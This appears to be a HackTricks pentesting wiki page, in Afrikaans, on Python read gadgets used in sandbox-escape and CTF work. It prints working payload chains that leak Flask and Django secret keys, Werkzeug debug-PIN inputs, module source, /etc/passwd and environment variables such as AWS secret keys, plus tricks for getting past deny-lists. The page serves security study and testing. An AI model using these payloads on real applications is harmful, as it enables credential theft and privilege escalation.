# Python Internal Read Gadgets

{{#include ../../banners/hacktricks-training.md}}

## Basiese Inligting

Verskillende vulnerabilities, soos [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) of [**Class Pollution**](class-pollution-pythons-prototype-pollution.md), kan jou moontlik toelaat om **interne Python-data te lees, maar sal jou nie toelaat om code uit te voer nie**. Daarom sal ’n pentester hierdie lees permissions ten beste moet benut om **sensitiewe privileges te verkry en die vulnerability te eskaleer**.

### Flask - Lees secret key

Die hoofbladsy van ’n Flask-toepassing sal waarskynlik die **`app`** global object bevat waar hierdie **secret gekonfigureer is**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
In hierdie geval is dit moontlik om toegang tot hierdie objek te verkry deur enige gadget te gebruik om **toegang tot globale objekte te verkry** vanaf die [**Bypass Python sandboxes-bladsy**](bypass-python-sandboxes/index.html).

In die geval waar **die kwesbaarheid in ’n ander python-lêer is**, benodig jy ’n gadget om deur lêers te navigeer om by die hooflêer uit te kom en sodoende **toegang tot die globale objek `app.secret_key` te verkry** en in staat te wees om [**voorregte te eskaleer** terwyl jy hierdie sleutel ken](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

’n Payload soos hierdie een [uit hierdie writeup](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Gebruik hierdie payload om **app.secret_key** te **lees**. As die oorspronklike bug jou ook ’n write primitive gee (byvoorbeeld class pollution), kan dieselfde pad gebruik word om dit te vervang en meer bevoorregte Flask-cookies te onderteken.

### Werkzeug - machine_id and node uuid

[**Deur hierdie payload uit hierdie writeup te gebruik**](https://vozec.fr/writeups/tweedle-dum-dee/) sal jy toegang tot die **machine_id** en die **uuid**-node kry, wat die **private bits** is wat jy nodig het om [**die Werkzeug pin te genereer**](../../network-services-pentesting/pentesting-web/werkzeug.md) en toegang tot die python console in `/console` te verkry indien die **debug mode geaktiveer** is:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Let daarop dat jy die **bediener se plaaslike pad na die `app.py`** kan kry deur ’n **fout** op die webblad te genereer wat die **pad sal vertoon**.

As die kwesbaarheid in ’n ander Python-lêer is, kyk na die vorige Flask-truuk om toegang tot die objekte vanuit die hoof-Python-lêer te verkry.

### Django - SECRET_KEY en settings-module

Die Django settings-objek word in `sys.modules` gekas sodra die toepassing begin. Met slegs read primitives kan jy die **`SECRET_KEY`**, fallback-sleutels, databasisbewyse of signing salts uitlek:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
As die kwesbare gadget in ’n ander module is, gaan eers deur globals:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` is net so waardevol soos die huidige `SECRET_KEY`: hulle valideer steeds ou signed values tydens rotasie.<sup>[[1]](#references)</sup> Lek ook `SESSION_ENGINE` en `SESSION_SERIALIZER` uit om vinnig te bepaal of die impak slegs cookie forgery is of iets sterker. Vir besonderhede oor die webimpak, kyk na die [**Django pentesting-bladsy**](../../network-services-pentesting/pentesting-web/django.md).

### Module loader gadgets - lees bronkode en lêers

Gelaaide Python-modules behou gewoonlik ’n `__loader__`. File-backed loaders stel gereeld `get_source()` en `get_data()` bloot, wat perfekte **lees-alleen-primitiewe** is wanneer jy reeds toegang tot ’n module-objek het, maar nie tot `open()` nie:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Dit is baie nuttig om **config modules, blueprints, helper files of hidden routes** te dump en API keys, DSNs, flag paths of bykomende gadget entry points te herwin.

As jy slegs subclass enumeration het, soek die loader volgens naam eerder as om ’n index hard te kodeer:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Globals van generator-/coroutine-raamwerke

As jy ’n generator-/coroutine-objek kan skep of bereik, kan sy raamwerk globals uitlek **sonder dat enige funksie se `__globals__`-gadget nodig is**. Dit is nuttig teen filters wat slegs dunder-name blokkeer en raamwerkeienskappe soos `gi_frame`, `ag_frame`, `cr_frame` of `f_globals` vergeet:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Sodra jy die frame globals het, gaan presies voort soos met die ander gadgets (`sys.modules`, settings objects, `os.environ`, ens.). Onlangse sandbox escapes herontdek dit voortdurend omdat `gi_frame` en `f_globals` nie dunder attributes is nie en dikwels naïewe deny-lists oorleef.

### Omgewingsveranderlikes / cloud credentials via gelaaide modules

Baie jails importeer steeds êrens `os` of `sys`. Jy kan enige bereikbaarbare funksie se `__init__.__globals__` misbruik om na die reeds geïmporteerde `os`-module oor te skakel en **omgewingsveranderlikes** te dump wat API-tokens, cloud keys of flags bevat:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Indien die subklasindeks gefiltreer word, gebruik loaders:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Omgewingsveranderlikes is dikwels die enigste secrets wat nodig is om van read na volledige kompromittering te beweeg (cloud IAM keys, database URLs, signing keys, ens.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), geaffekteerde weergawes `<0.61.0`) het **class pollution** deur middel van vervaardigde component requests toegelaat. ’n Property path soos `__init__.__globals__` kon toegang verkry tot component-module globals en imported modules; die advisory demonstreer die oorskryf van Django se `SECRET_KEY` en waardes in `os.environ`, eerder as ’n read-only exploit.<sup>[[5]](#references)</sup> Indien ’n afsonderlike bug read access tot dieselfde object graph verskaf, kan daardie globals configuration en credentials blootlê sonder dat code execution nodig is.

### Gadget collections for chaining

Onlangse CTFs en pyjail-navorsing toon betroubare read chains wat slegs met attribute access en subclass enumeration gebou is. Community-maintained lists soos [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) katalogiseer honderde minimale gadgets wat jy kan kombineer om van objects na `__globals__`, `sys.modules` en uiteindelik sensitiewe data te beweeg.<sup>[[2]](#references)</sup> Verkies **attribute/name based searches** bo raw subclass indexes, omdat die posisie van `os._wrap_close`, `FileLoader`, `warnings.catch_warnings`, ens. tussen Python-weergawes en met ekstra imported libraries verander.

## References

- [1] [Django-dokumentasie oor kriptografiese signing](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – Python sandbox gadget-wiki](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – FCSC 2023 writeup](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Django-Unicorn class pollution vulnerability, wat tot RCE, XSS, DoS en authentication bypass lei (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)
{{#include ../../banners/hacktricks-training.md}}
